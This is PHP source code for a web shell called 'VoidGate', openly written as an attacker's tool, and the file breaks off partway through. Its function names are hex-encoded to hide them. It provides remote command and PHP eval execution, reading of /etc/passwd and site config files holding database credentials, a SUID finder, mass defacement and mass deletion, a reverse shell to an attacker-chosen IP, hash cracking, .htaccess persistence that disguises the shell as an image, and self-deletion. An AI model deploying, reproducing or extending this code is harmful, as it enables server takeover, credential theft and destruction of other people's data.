<?php
/**
 * VoidGate WebShell - <DekstopSite>
 * Developed by Nyx6st, based on concept by 0x6ick
 * © 2025 - 6ickZone
 */
@set_time_limit(0);
@clearstatcache();
@error_reporting(0);
@ini_set('error_log', null);
@ini_set('log_errors', 0);
@ini_set('max_execution_time', 0);
@ini_set('output_buffering', 0);
@ini_set('display_errors', 0);

// --- Config ---
$CONFIG = [
    'title'             => 'VoidGate_<DekstopSite',
    'author'            => '0x6ick x Nyx6st',
    'password'          => 'admin', /*default admin.isi   null tanpa 'untuk menonaktifkan.*/
];

// --- HEX-ENCODED ---
$f = [ "66756E6374696F6E5F657869737473", "6865783262696E", "66696C655F6765745F636F6E74656E7473", "66696C655F7075745F636F6E74656E7473", "69735F66696C65", "69735F646972", "756E6C696E6B", "726D646972", "7363616E646972", "676574637764", "6368646972", "7265616C70617468", "6469726E616D65", "626173656E616D65", "68746D6C7370656369616C6368617273", "66696C6573697A65", "66696C657065726D73", "737072696E7466", "64617465", "66696C656D74696D65", "63686D6F64", "6D6B646972", "72656E616D65", "7068705F756E616D65", "636F7079", "7368656C6C5F65786563", "73657373696F6E5F7374617274", "696E695F676574", "70617468696E666F", "636C6173735F657869737473", "6576616C", "706870696E666F", "73657373696F6E5F64657374726F79", "66736F636B6F70656E", "70636E746C5F666F726B", "706F7369785F736574736964", "69735F7772697461626C65", "69735F7265616461626C65", "6469736B5F746F74616C5F7370616365", "6469736B5F667265655F7370616365", "6765745F63757272656E745F75736572", "707265675F6D61746368", "737472706F73" ];
foreach ($f as $k => $v) { $f[$k] = hex2bin($v); } unset($k, $v);

// --- HANDLER kill ---
if (isset($_GET['self_destruct'])) {
    if (@$f[6](__FILE__)) { echo "VoidGate has been destroyed. Goodbye."; exit; }
    else { echo "Self-destruct failed. Check file permissions."; exit; }
}
session_start();
if (isset($_GET['logout'])) { session_destroy(); header("Location: ".$_SERVER['PHP_SELF']); exit; }
if (isset($_GET['phpinfo'])) { phpinfo(); exit; }

// --- LOGIN HANDLER ---
if ($CONFIG['password'] && (!isset($_SESSION['authed']) || !$_SESSION['authed'])) {
    if (isset($_POST['pass']) && $_POST['pass'] === $CONFIG['password']) {
        $_SESSION['authed'] = true;
    } else {
        die('<style>body{background:#1a1a1a;color:cyan;font-family:monospace;display:flex;justify-content:center;align-items:center;height:100vh;margin:0;}form{border:1px solid cyan;padding:20px;}input{background:transparent;color:cyan;border:1px solid cyan;padding:5px;}</style><form method="POST">Password: <input type="password" name="pass"><input type="submit" value="Enter"></form>');
    }
}

// --- helper ---
function load_adminer($output_filename) {
    global $f;
    $adminer_path = __DIR__ . '/' . $output_filename;

    if (!$f[36](__DIR__)) {
        return "Error: Direktori saat ini tidak writable.";
    }
    
    //adminer dwnld
    $url = 'https://www.adminer.org/latest.php';
    $content = false;
    
    if ($f[0]('curl_init')) { // function_exists
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
        $content = curl_exec($ch);
        curl_close($ch);
    } elseif ($f[27]('allow_url_fopen')) { // ini_get
        $content = @$f[2]($url); // file_get_contents
    } else {
        return "Error: cURL dan allow_url_fopen nonaktif. Tidak bisa download.";
    }
    
    if ($content) {
        if ($f[3]($adminer_path, $content)) { // file_put_contents
            return true;
        } else {
            return "Error: Gagal menyimpan file Adminer.";
        }
    }
    
    return "Error: Gagal mendownload konten Adminer.";
}
function executeCommand($cmd){global $f;if($f[0]('shell_exec'))return $f[25]($cmd);if($f[0]('exec')){exec($cmd,$o);return implode("\n",$o);}if($f[0]('passthru')){ob_start();passthru($cmd);return ob_get_clean();}if($f[0]('system')){ob_start();system($cmd);return ob_get_clean();}return"Execution disabled.";}
function formatSize($b){if($b>=1073741824)return number_format($b/1073741824,2).' GB';if($b>=1048576)return number_format($b/1048576,2).' MB';if($b>=1024)return number_format($b/1024,2).' KB';return $b.' B';}
function getPerms($file){global $f;$p=@$f[16]($file);$i='u';if(($p&0xC000)==0xC000)$i='s';elseif(($p&0xA000)==0xA000)$i='l';elseif(($p&0x8000)==0x8000)$i='-';elseif(($p&0x6000)==0x6000)$i='b';elseif(($p&0x4000)==0x4000)$i='d';elseif(($p&0x2000)==0x2000)$i='c';elseif(($p&0x1000)==0x1000)$i='p';$i.=(($p&0x0100)?'r':'-');$i.=(($p&0x0080)?'w':'-');$i.=(($p&0x0040)?(($p&0x0800)?'s':'x'):(($p&0x0800)?'S':'-'));$i.=(($p&0x0020)?'r':'-');$i.=(($p&0x0010)?'w':'-');$i.=(($p&0x0008)?(($p&0x0400)?'s':'x'):(($p&0x0400)?'S':'-'));$i.=(($p&0x0004)?'r':'-');$i.=(($p&0x0002)?'w':'-');$i.=(($p&0x0001)?(($p&0x0200)?'t':'x'):(($p&0x0200)?'T':'-'));return $i;}
function deleteRecursive($dir){global $f;if(!$f[5]($dir))return $f[6]($dir);$items=array_diff($f[8]($dir),['.','..']);foreach($items as $item){$path=$dir.DIRECTORY_SEPARATOR.$item;if($f[5]($path))deleteRecursive($path);else $f[6]($path);}return $f[7]($dir);}
//massdeface
function massDefaceRecursive($dir, $filename, $content, &$results, $force = false) {
    global $f;
    try {
        $iterator = new RecursiveIteratorIterator(
            new RecursiveDirectoryIterator($dir, RecursiveDirectoryIterator::SKIP_DOTS),
            RecursiveIteratorIterator::SELF_FIRST
        );
        foreach ($iterator as $item) {
            if ($f[5]($item->getPathname())) { // is_dir()
                $path = $item->getPathname();
                $target_file = $path . DIRECTORY_SEPARATOR . $filename;
                
                // -- PENAMBAHAN FITUR FORCE MODE --
                if ($force && !$f[36]($path)) { // is_writable()
                    @$f[20]($path, 0755); // chmod()
                }
                
                if (@$f[3]($target_file, $content)) { // file_put_contents()
                    $results['success'][] = $target_file;
                } else {
                    $results['failed'][] = $target_file;
                }
            }
        }
    } catch (Exception $e) {
        $results['failed'][] = "Error scanning directory $dir: " . $e->getMessage();
    }
}

// FUNGSI BARU UNTUK MASS DELETE
function massDeleteRecursive($dir, $filename, &$results) {
    global $f;
    try {
        $iterator = new RecursiveIteratorIterator(
            new RecursiveDirectoryIterator($dir, RecursiveDirectoryIterator::SKIP_DOTS),
            RecursiveIteratorIterator::LEAVES_ONLY // Hanya proses file, bukan direktori
        );
        foreach ($iterator as $item) {
            if ($item->isFile() && $item->getFilename() === $filename) {
                $target_file = $item->getPathname();
                if (@$f[6]($target_file)) { // unlink()
                    $results['success'][] = $target_file;
                } else {
                    $results['failed'][] = $target_file;
                }
            }
        }
    } catch (Exception $e) {
        $results['failed'][] = "Error scanning directory $dir: " . $e->getMessage();
    }
}
function redirect($params=[]){header("Location: ?".http_build_query(array_filter($params)));exit;}
function zipFolder($z,$fo,$bP){global $f;$files=new RecursiveIteratorIterator(new RecursiveDirectoryIterator($fo),RecursiveIteratorIterator::LEAVES_ONLY);foreach($files as $name=>$file){if(!$file->isDir()){$fP=$file->getRealPath();$rP=substr($fP,strlen($bP)+1);$z->addFile($fP,$rP);}}}
function findInterestingDirs($start_dir,&$results,$depth=0){global $f;if($depth>4)return;$common_dirs=['/tmp','/var/tmp','/home/'];if($depth==0){$scan_dirs=array_unique(array_merge([$start_dir,$f[12]($start_dir)],$common_dirs));}else{$scan_dirs=[$start_dir];}foreach($scan_dirs as $dir){if(@$f[36]($dir)){$results[]=$dir;}if($depth>0&&$f[5]($dir)){$items=@$f[8]($dir);if(!$items)continue;foreach($items as $item){if($item=='.'||$item=='..')continue;$path=$dir.'/'.$item;if($f[5]($path))findInterestingDirs($path,$results,$depth+1);}}}}
function findStringsInFiles($dir, $query, $is_regex, &$results) { global $f; try { $items = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($dir, RecursiveDirectoryIterator::SKIP_DOTS), RecursiveIteratorIterator::SELF_FIRST); } catch (Exception $e) { return; } foreach ($items as $item) { if ($item->isFile() && $f[37]($item->getPathname())) { $content = $f[2]($item->getPathname()); $match = $is_regex ? @$f[41]($query, $content) : $f[42]($content, $query) !== false; if ($match) { $results[] = $item->getPathname(); } } } }
function findSuidSgidFiles($dir, &$results) { global $f; try { $items = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($dir, RecursiveDirectoryIterator::SKIP_DOTS), RecursiveIteratorIterator::SELF_FIRST); } catch (Exception $e) { return; } foreach ($items as $item) { if ($item->isFile()) { $perms = $item->getPerms(); if (($perms & 04000) || ($perms & 02000)) { $results[] = $item->getPathname() . ' -> ' . substr($f[17]('%o', $perms), -4); } } } }
function identify_hash($hash) { global $f; if ($f[41]('/^\$2[ayb]\$.{56}$/i', $hash)) return 'Bcrypt (WordPress, etc.)'; if ($f[41]('/^[a-f0-9]{32}$/i', $hash)) return 'MD5'; if ($f[41]('/^[a-f0-9]{40}$/i', $hash)) return 'SHA-1'; if ($f[41]('/^[a-f0-9]{64}$/i', $hash)) return 'SHA-256'; if ($f[41]('/^[a-f0-9]{128}$/i', $hash)) return 'SHA-512'; return 'Unknown'; }
function crack_hash_api($hash) { global $f; $content = @$f[2]('https://api.crackstation.net/precompute/' . $hash); if($content && $f[41]('/"result": "([^"]+)"/', $content, $matches)) { return $matches[1]; } return false; }

// --- config finder ---
function smartConfigFinder(&$results) {
    global $f;
    $current_dir = $f[11]($f[9]()); // getcwd()
    $root_config_files = ['wp-config.php', 'configuration.php', 'config.php', '.env'];

    // Traverse up to find root configs
    $search_path = $current_dir;
    while ($search_path && $search_path !== '/' && $f[12]($search_path) !== $search_path) {
        foreach ($root_config_files as $cfg) {
            $file_path = $search_path . '/' . $cfg;
            if ($f[4]($file_path)) {
                $results[] = $file_path;
            }
        }
        $search_path = $f[12]($search_path); // dirname()
    }
    $results = array_unique($results);
}


$path=$f[11]($f[9]());if(isset($_GET['path'])&&!empty($_GET['path'])){$newPath=$f[11]($_GET['path']);if($newPath&&$f[5]($newPath))$path=$newPath;}@$f[10]($path);
$page=isset($_GET['p'])?$_GET['p']:'dashboard';$action=isset($_GET['action'])?$_GET['action']:'';$target=isset($_GET['target'])?$_GET['target']:'';$target_path=$path.'/'.$target;
if($_SERVER['REQUEST_METHOD']==='POST'){ $redirect_params=['p'=>$page,'path'=>$path]; if(isset($_FILES['upload_file'])){if($f[24]($_FILES['upload_file']['tmp_name'],$path.'/'.$f[13]($_FILES['upload_file']['name'])))redirect(array_merge($redirect_params,['msg'=>'Uploaded.']));else redirect(array_merge($redirect_params,['msg'=>'Upload Failed!','status'=>'error']));} if(isset($_POST['create'])){$name=$f[13]($_POST['name']);$type=$_POST['type'];if($type=='file'){if($f[3]($path.'/'.$name,'')!==false)redirect(array_merge($redirect_params,['msg'=>"File created."]));else redirect(array_merge($redirect_params,['msg'=>"Failed!",'status'=>'error']));}elseif($type=='dir'){if($f[21]($path.'/'.$name))redirect(array_merge($redirect_params,['msg'=>"Dir created."]));else redirect(array_merge($redirect_params,['msg'=>"Failed!",'status'=>'error']));}} if(isset($_POST['edit_save'])){if($f[3]($_POST['target_file'],$_POST['content'])!==false)redirect(array_merge($redirect_params,['msg'=>'Saved.']));else redirect(array_merge($redirect_params,['msg'=>'Save Failed!','status'=>'error']));} if(isset($_POST['chmod_save'])){if($f[20]($_POST['target_file'],octdec($_POST['perms'])))redirect(array_merge($redirect_params,['msg'=>'Perms changed.']));else redirect(array_merge($redirect_params,['msg'=>'Chmod Failed!','status'=>'error']));} if(isset($_POST['rename_save'])){$new_name=$f[13]($_POST['new_name']);$new_path=$f[12]($_POST['target_file']).'/'.$new_name;if($f[22]($_POST['target_file'],$new_path))redirect(array_merge($redirect_params,['path'=>$f[12]($_POST['target_file']),'msg'=>"Renamed."]));else redirect(array_merge($redirect_params,['msg'=>'Rename Failed!','status'=>'error']));} if(isset($_POST['extract_save'])&&$f[29]('ZipArchive')){$zip=new ZipArchive;if($zip->open($_POST['target_file'])===TRUE){$zip->extractTo($path);$zip->close();redirect(array_merge($redirect_params,['msg'=>'Extracted.']));}else{redirect(array_merge($redirect_params,['msg'=>'Extract Failed!','status'=>'error']));}} if(isset($_POST['zip_selected'])&&$f[29]('ZipArchive')&&!empty($_POST['selected_files'])){$zip_fn='archive_'.date('Y-m-d').'.zip';$zip_fp=$path.'/'.$zip_fn;$zip=new ZipArchive();if($zip->open($zip_fp,ZipArchive::CREATE|ZipArchive::OVERWRITE)===TRUE){foreach($_POST['selected_files'] as $file){$fp=$f[11]($file);if($f[4]($fp))$zip->addFile($fp,$f[13]($fp));elseif($f[5]($fp))zipFolder($zip,$fp,$path);}$zip->close();redirect(array_merge($redirect_params,['msg'=>'Zipped to '.$zip_fn]));}else{redirect(array_merge($redirect_params,['msg'=>'Zip Failed!','status'=>'error']));}}}
if($action==='delete'){if(deleteRecursive($target_path))redirect(['p'=>'files','path'=>$path,'msg'=>"Deleted '$target'."]);else redirect(['p'=>'files','path'=>$path,'msg'=>"Delete Failed!",'status'=>'error']);}
?>
<!DOCTYPE html>
<html><head><title><?php echo $f[14]($CONFIG['title']);?></title><meta name="viewport" content="width=device-width, initial-scale=1.0"><style>:root{--bg:#1a1a1a;--fg:#e0e0e0;--highlight:#00ffff;--link:#00ffff;--border:#00ffff;--header:#111;--hover:#2a2a2a;--success:#27ae60;--error:#c0392b;}*,*:before,*:after{box-sizing:border-box;}body{background-color:var(--bg);color:var(--fg);font-family:'Consolas','Courier New',monospace;margin:0;font-size:14px;}.container{max-width:1200px;margin:15px auto;padding:0 15px;}h1,h2,h3{color:var(--highlight);border-bottom:1px solid var(--border);padding-bottom:5px;margin-top:20px;}h1{text-align:center;border:none;font-size:2.5em;margin:10px 0 20px 0;}a{color:var(--link);text-decoration:none;}a:hover{text-decoration:underline;}table{width:100%;border-collapse:collapse;}th,td{padding:8px 10px;text-align:left;}th{background-color:var(--header);}.file-table tbody tr:hover td{background-color:var(--hover);}.file-table td{border:1px solid #444;}.path-nav{margin-bottom:15px;word-wrap:break-word;line-height:1.6;background:#222;padding:10px;border-radius:4px;}.message{padding:10px;margin:15px 0;border-radius:4px;color:#fff;text-align:center;}.message.success{background-color:var(--success);}.message.error{background-color:var(--error);}.action-box{background-color:#222;padding:20px;border-radius:5px;margin-bottom:20px;border:1px solid #333;}input[type="text"],input[type="password"],textarea,select{background-color:#333;color:var(--fg);border:1px solid #666;padding:8px;width:100%;font-family:inherit;border-radius:3px;}textarea{height:150px;resize:vertical;}input[type="submit"]{background-color:var(--highlight);color:#000;border:none;padding:10px 15px;cursor:pointer;font-weight:bold;margin-top:10px;border-radius:3px;}.file-actions a{margin-right:10px;white-space:nowrap;}.tabs{display:flex;flex-wrap:wrap;border-bottom:1px solid var(--border);margin-bottom:20px;}.tabs a{padding:10px 15px;color:var(--fg);text-decoration:none;border:1px solid transparent;border-bottom:none;text-align:center;flex-grow:1;}.tabs a.active{background:#222;color:var(--highlight);border-color:var(--border);border-bottom-color:#222;position:relative;top:1px;}#phpinfo-iframe{width:100%;height:60vh;border:1px solid #444;}pre{background:#111;padding:10px;overflow-x:auto;white-space:pre-wrap;word-wrap:break-word;max-height:400px;}.dashboard-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(300px,1fr));gap:20px;}.progress-bar{background:#555;border-radius:5px;overflow:hidden;}.progress-bar div{background:var(--highlight);color:#000;padding:2px 5px;text-align:center;white-space:nowrap;}@media screen and (max-width:768px){h1{font-size:1.8em;}.container{padding:0 10px;}.action-box{padding:15px;}.tabs a{flex-basis:calc(50% - 2px);}.file-table thead{display:none;}.file-table,.file-table tbody,.file-table tr,.file-table td{display:block;width:100%;}.file-table tr{margin-bottom:15px;border:1px solid #444;border-radius:4px;overflow:hidden;}.file-table td{text-align:right;padding-left:40%;position:relative;border:none;border-bottom:1px dotted #333;min-height:2.5em;display:flex;align-items:center;justify-content:flex-end;}.file-table td[data-label="Name"]{word-break:break-all;}.file-table td:last-child{border-bottom:none;}.file-table td:before{content:attr(data-label);position:absolute;left:10px;width:35%;text-align:left;font-weight:bold;color:var(--highlight);}.file-table td[colspan="6"]{padding-left:10px;justify-content:flex-start;}.file-table td[colspan="6"]:before{display:none;}}</style></head><body>
<div class="container"><h1><?php echo $f[14]($CONFIG['title']);?></h1><div class="tabs">
<a href="?p=dashboard" class="<?php if($page=='dashboard')echo'active';?>">Dashboard</a>
<a href="?p=files&path=<?php echo urlencode($path);?>" class="<?php if($page=='files')echo'active';?>">Files</a>
<a href="?p=cmd" class="<?php if($page=='cmd')echo'active';?>">Terminal</a>
<a href="?p=db" class="<?php if($page=='db')echo'active';?>">Database</a>
<a href="?p=mass" class="<?php if($page=='mass')echo'active';?>">Mass Tools</a>
<a href="?p=net" class="<?php if($page=='net')echo'active';?>">Network</a>
<a href="?p=crypto" class="<?php if($page=='crypto')echo'active';?>">Kill & Crypto</a>
<a href="?p=info" class="<?php if($page=='info')echo'active';?>">Info</a>
<?php if($CONFIG['password'])echo'<a href="?logout=true">Logout</a>';?></div>
<?php if(isset($_GET['msg'])):?><div class="message <?php echo $f[14]($_GET['status']);?>"><?php echo$f[14]($_GET['msg']);?></div><?php endif;?>
<?php switch($page):case'dashboard':?><div class="dashboard-grid"><div class="action-box"><h3>Info Server</h3><table style="width:100%"><tr><td><b>Uname</b></td><td><?php echo $f[14]($f[23]());?></td></tr><tr><td><b>User</b></td><td><?php echo $f[14]($f[40]());?></td></tr><tr><td><b>Server IP</b></td><td><?php echo $_SERVER['SERVER_ADDR']?$_SERVER['SERVER_ADDR']:gethostbyname($_SERVER['HTTP_HOST']);?></td></tr><tr><td><b>Your IP</b></td><td><?php echo $_SERVER['REMOTE_ADDR'];?></td></tr><tr><td><b>Disabled</b></td><td style="word-break:break-all;"><?php echo $f[14]($f[27]('disable_functions'))?:'<i>None</i>';?></td></tr></table></div><div class="action-box"><h3>Info Disk</h3><?php $ds_root=stristr(PHP_OS,'WIN')?'C:':'/';$total_space=@$f[38]($ds_root);$free_space=@$f[39]($ds_root);if($total_space&&$free_space){$used_space=$total_space-$free_space;$used_percent=round(($used_space/$total_space)*100);echo'<p>'.formatSize($used_space).' / '.formatSize($total_space).' ('.$used_percent.'%)</p><div class="progress-bar"><div style="width:'.$used_percent.'%;">'.$used_percent.'%</div></div>';}else{echo'<p>Tidak dapat mengambil info disk.</p>';}?></div><div class="action-box"><h3>Pengguna Server</h3><pre><?php $passwd=@$f[2]('/etc/passwd');if($passwd){echo $f[14]($passwd);}else{echo'<i>Tidak dapat membaca /etc/passwd</i>';}?></pre></div><div class="action-box"><h3>Direktori Writable</h3><pre><?php $writable_dirs=[];findInterestingDirs($path,$writable_dirs);if(!empty($writable_dirs)){foreach(array_unique($writable_dirs)as $dir){echo $f[14]($dir)."\n";}}else{echo'<i>Tidak ada direktori writable yang ditemukan.</i>';}?></pre></div></div><?php break; case'cmd':?><div class="action-box"><h3>Command Execution</h3><form method="POST"><input type="text" name="cmd" placeholder="e.g. whoami" autofocus><input type="submit" value="Execute"></form><?php if(isset($_POST['cmd'])):?><h3>Output:</h3><pre><?php echo $f[14](executeCommand($_POST['cmd']));?></pre><?php endif;?></div><?php break;
case'eval':?><div class="action-box"><h3>PHP Code Executor</h3><form method="POST"><textarea name="php_code" placeholder="e.g. echo phpversion();"><?php if(isset($_POST['php_code']))echo $f[14]($_POST['php_code']);?></textarea><input type="submit" value="Execute PHP"></form><?php if(isset($_POST['php_code'])):?><h3>Output:</h3><pre><?php ob_start();$f[30]($_POST['php_code']);echo $f[14](ob_get_clean());?></pre><?php endif;?></div><?php break;
case'info':?><div class="action-box"><h3>PHP Information</h3><iframe id="phpinfo-iframe" src="?phpinfo=true"></iframe></div><?php break;
case'db':?>
    <div class="action-box">
        <h3>Adminer Installer</h3>
        <p>Fitur ini akan mengunduh file Adminer terbaru ke direktori saat ini. Setelah itu, kamu bisa mengaksesnya langsung untuk me-manage database.</p>
        <form method="POST">
            <p>Nama File untuk Adminer:<br>
            <input type="text" name="adminer_filename" value="db_manager.php"></p>
            <input type="submit" name="install_adminer" value="Install Adminer">
        </form>

        <?php
        if (isset($_POST['install_adminer'])) {
            $filename = $_POST['adminer_filename'];
            if (empty($filename)) {
                echo '<div class="message error">Nama file tidak boleh kosong.</div>';
            } else {
                $result = load_adminer($filename);
                if ($result === true) {
                    $link = $f[14]($filename);
                    echo '<div class="message success">Adminer berhasil diinstall! <br>Akses di: <a href="'.$link.'" target="_blank" style="color:#000;font-weight:bold;">'.$link.'</a></div>';
                } else {
                    echo '<div class="message error">'.$f[14]($result).'</div>';
                }
            }
        }
        ?>
    </div>
<?php break;
case'mass':?>
    <div class="action-box"><h3>Config Finder</h3><form method="POST"><p>Click the button to automatically find main config files by traversing up from the current directory.</p><input type="submit" name="find_configs" value="Find Root Configs"></form><?php if(isset($_POST['find_configs'])){$results=[];smartConfigFinder($results);if(!empty($results)){echo'<h3>Configs Found:</h3><pre>';foreach($results as $r){echo'<b>'.$f[14]($r).'</b>'."\n".'<code style="color:var(--highlight)">'.$f[14]($f[2]($r)).'</code>'."\n\n";}echo'</pre>';}else{echo'<p>No main config files found.</p>';}}?></div>
    <div class="action-box"><h3>String Finder</h3><form method="POST"><p>Directory to search: <input type="text" name="search_dir" value="<?php echo $f[14]($path);?>"></p><p>String/Pattern: <input type="text" name="search_query" required></p><p><label><input type="checkbox" name="is_regex" style="width:auto;"> Use Regular Expression</label></p><input type="submit" name="string_finder" value="Find String"></form><?php if(isset($_POST['string_finder'])){$results=[];findStringsInFiles($_POST['search_dir'],$_POST['search_query'],isset($_POST['is_regex']),$results);if(!empty($results)){echo'<h3>Files containing "'.$f[14]($_POST['search_query']).'":</h3><pre>'.$f[14](implode("\n",$results)).'</pre>';}else{echo'<p>No files found containing that string.</p>';}}?></div>
    <div class="action-box"><h3>SUID/SGID Finder</h3><form method="POST"><p>Directory to scan: <input type="text" name="suid_dir" value="/usr/bin"></p><input type="submit" name="suid_finder" value="Find SUID/SGID Files"></form><?php if(isset($_POST['suid_finder'])){$results=[];findSuidSgidFiles($_POST['suid_dir'],$results);if(!empty($results)){echo'<h3>Potentially exploitable files found:</h3><pre>'.$f[14](implode("\n",$results)).'</pre>';}else{echo'<p>No SUID/SGID files found in that directory.</p>';}}?></div>
    
    <div class="action-box">
        <h3>Mass Deface v2</h3>
        <form method="POST">
            <p>Target Folder:<br><input type="text" name="deface_dir" value="<?php echo $f[14]($path);?>"></p>
            <p>Filename:<br><input type="text" name="deface_filename" value="index.html"></p>
            <p>File Content:<br><textarea name="deface_content">Hacked</textarea></p>
            <p><label><input type="checkbox" name="force_mode" value="1" style="width:auto; vertical-align:middle;"> <b>Force Mode</b> (Coba chmod 0755 pada direktori)</label></p>
            <input type="submit" name="start_deface" value="Start Mass Deface">
        </form>
        <?php 
        if(isset($_POST['start_deface'])){
            $results=['success'=>[],'failed'=>[]];
            $force_mode = isset($_POST['force_mode']);
            massDefaceRecursive($_POST['deface_dir'],$_POST['deface_filename'],$_POST['deface_content'],$results, $force_mode);
            echo'<h3>Results:</h3><p>Success ('.count($results['success']).'):</p><pre>'.(empty($results['success'])?'None':$f[14](implode("\n",$results['success']))).'</pre><p>Failed ('.count($results['failed']).'):</p><pre>'.(empty($results['failed'])?'None':$f[14](implode("\n",$results['failed']))).'</pre>';
        }
        ?>
    </div>

    <div class="action-box">
        <h3>Mass Delete</h3>
        <form method="POST">
            <p>Target Folder:<br><input type="text" name="delete_dir" value="<?php echo $f[14]($path);?>"></p>
            <p>Filename to Delete:<br><input type="text" name="delete_filename" value="index.html"></p>
            <input type="submit" name="start_delete" value="Start Mass Delete" style="background-color:var(--error);color:#fff;">
        </form>
        <?php
        if(isset($_POST['start_delete'])){
            $results=['success'=>[],'failed'=>[]];
            massDeleteRecursive($_POST['delete_dir'],$_POST['delete_filename'], $results);
            echo'<h3>Results:</h3><p>Deleted ('.count($results['success']).'):</p><pre>'.(empty($results['success'])?'None':$f[14](implode("\n",$results['success']))).'</pre><p>Failed ('.count($results['failed']).'):</p><pre>'.(empty($results['failed'])?'None':$f[14](implode("\n",$results['failed']))).'</pre>';
        }
        ?>
    </div>
    <?php break;
case'net':?><div class="action-box"><h3>Port Scanner</h3><form method="POST"><p>Host: <input type="text" name="scan_host" value="127.0.0.1"> Ports (comma separated): <input type="text" name="scan_ports" value="21,22,80,443,3306,5432"></p><input type="submit" name="port_scan" value="Scan Ports"></form><?php if(isset($_POST['port_scan'])){echo'<h3>Scan Results:</h3><pre>';$ports=explode(',',$_POST['scan_ports']);foreach($ports as $p){$p=trim($p);if(!$p)continue;$conn=@$f[33]($_POST['scan_host'],$p,$errno,$errstr,1);if($conn){echo"Port $p: [OPEN]\n";@fclose($conn);}else{echo"Port $p: [CLOSED]\n";}}echo'</pre>';}?></div><div class="action-box"><h3>Back-Connect</h3><form method="POST"><p>IP Address: <input type="text" name="bc_ip" placeholder="Your IP"> Port: <input type="text" name="bc_port" placeholder="Your Port"></p><input type="submit" name="back_connect" value="Connect"></form><?php if(isset($_POST['back_connect'])){$ip=$_POST['bc_ip'];$port=$_POST['bc_port'];if($f[0]($f[34])&&$f[0]($f[35])){$pid=@$f[34]();if($pid){@$f[35]();$sock=@$f[33]($ip,$port);if($sock){@dup2($sock,0);@dup2($sock,1);@dup2($sock,2);$shell=@$f[30]('return "'.(stristr(PHP_OS,'WIN')?'cmd.exe':'/bin/sh -i').'";');@$f[25]($shell);}else{echo'<pre>Connection Failed.</pre>';}}}else{echo'<pre>Error: pcntl_fork or posix_setsid not available.</pre>';}}?></div><?php break;
case'crypto':?><div class="action-box"><h3>Hash Identifier & Cracker</h3><form method="POST"><p>Hash:</p><textarea name="hash_input" style="height:100px;"><?php echo isset($_POST['hash_input'])?$f[14]($_POST['hash_input']):'';?></textarea><input type="submit" name="hash_tools" value="Identify & Crack"></form><?php if(isset($_POST['hash_tools'])){$hash=trim($_POST['hash_input']);echo'<h3>Results for: '.$f[14]($hash).'</h3>';$type=identify_hash($hash);echo'<p><b>Detected Type:</b> '.$f[14]($type).'</p>';$cracked=crack_hash_api($hash);if($cracked){echo'<p><b>CrackStation API Result:</b> <span style="color:var(--success);font-weight:bold;">'.$f[14]($cracked).'</span></p>';}else{echo'<p><b>CrackStation API Result:</b> Not Found</p>';}}?></div><div class="action-box"><h3>HTAccess Persistence</h3><form method="POST"><p>File to Hide (e.g., this shell): <input type="text" name="hide_file" value="<?php echo$f[14]($f[13](__FILE__));?>"></p><p>Fake Name (e.g., logo.png): <input type="text" name="fake_name" value="logo.png"></p><input type="submit" name="htaccess_inject" value="Inject Rule to .htaccess"></form><?php if(isset($_POST['htaccess_inject'])){$htaccess_path=$path.'/.htaccess';$rule="\nRewriteEngine On\nRewriteRule ^".$f[14]($_POST['fake_name'])."$ ".$f[14]($_POST['hide_file'])." [L]\n";if($f[3]($htaccess_path,$f[2]($htaccess_path).$rule)!==false){echo'<p style="color:var(--success)">Rule injected! Now try to access '.$f[14]($_POST['fake_name']).'</p>';}else{echo'<p style="color:var(--error)">Failed to write to .htaccess</p>';}}?></div><div class="action-box"><h3>Self Destruct</h3><p>This will permanently delete this webshell file from the server.</p><a href="?self_destruct=true" onclick="return confirm('ARE YOU ABSOLUTELY SURE? This action is irreversible.')" style="color:var(--error);font-weight:bold;">[ Self Destruct Now ]</a></div><?php break;case'files':default:$action_target=isset($_GET['target'])?$f[11]($path.'/'.$_GET['target']):'';if($action=='edit'&&$f[4]($action_target)){echo'<div class="action-box"><h3>Edit: '.$f[14]($f[13]($action_target)).'</h3><form method="POST"><textarea name="content">'.$f[14]($f[2]($action_target)).'</textarea><input type="hidden" name="target_file" value="'.$f[14]($action_target).'"><input type="submit" name="edit_save" value="Save"></form></div>';}elseif($action=='chmod'){echo'<div class="action-box"><h3>Chmod: '.$f[14]($f[13]($action_target)).'</h3><form method="POST"><input type="text" name="perms" value="'.substr($f[17]('%o',@$f[16]($action_target)),-4).'"><input type="hidden" name="target_file" value="'.$f[14]($action_target).'"><input type="submit" name="chmod_save" value="Save"></form></div>';}elseif($action=='rename'){echo'<div class="action-box"><h3>Rename: '.$f[14]($f[13]($action_target)).'</h3><form method="POST"><input type="text" name="new_name" value="'.$f[14]($f[13]($action_target)).'"><input type="hidden" name="target_file" value="'.$f[14]($action_target).'"><input type="submit" name="rename_save" value="Rename"></form></div>';}elseif($action=='extract'){echo'<div class="action-box"><h3>Extract: '.$f[14]($f[13]($action_target)).'</h3><p>Extract to current directory?</p><form method="POST"><input type="hidden" name="target_file" value="'.$f[14]($action_target).'"><input type="submit" name="extract_save" value="Yes, Extract"></form></div>';}else{?><div class="path-nav"><strong>Path:</strong> <?php $path_parts=explode('/',str_replace('\\','/',$path));$built_path='';foreach($path_parts as $i=>$part){if(empty($part)&&$i==0){echo'<a href="?p=files&path=/">/</a>';continue;}if(empty($part))continue;$built_path.='/'.$part;echo'<a href="?p=files&path='.urlencode($built_path).'">'.$f[14]($part).'</a>/';}?></div><div class="action-box"><h3>Upload</h3><form method="POST" enctype="multipart/form-data"><input type="file" name="upload_file"><input type="submit" value="Upload"></form></div><div class="action-box"><h3>Create</h3><form method="POST"><select name="type" style="width:auto;"><option value="file">File</option><option value="dir">Directory</option></select><input type="text" name="name" placeholder="Name" required style="width:auto;margin:0 10px;"><input type="submit" name="create" value="Create"></form></div><form method="POST"><table class="file-table"><thead><tr><th><input type="checkbox" onclick="document.querySelectorAll('.file-checkbox').forEach(c=>c.checked=this.checked)"></th><th>Name</th><th>Size</th><th>Perms</th><th>Modified</th><th>Actions</th></tr></thead><tbody><?php if($path!='/')echo'<tr><td colspan="6"><a href="?p=files&path='.urlencode($f[12]($path)).'">.. (Parent)</a></td></tr>';$files=@$f[8]($path);$dirs_list=[];$files_list=[];if($files){foreach($files as 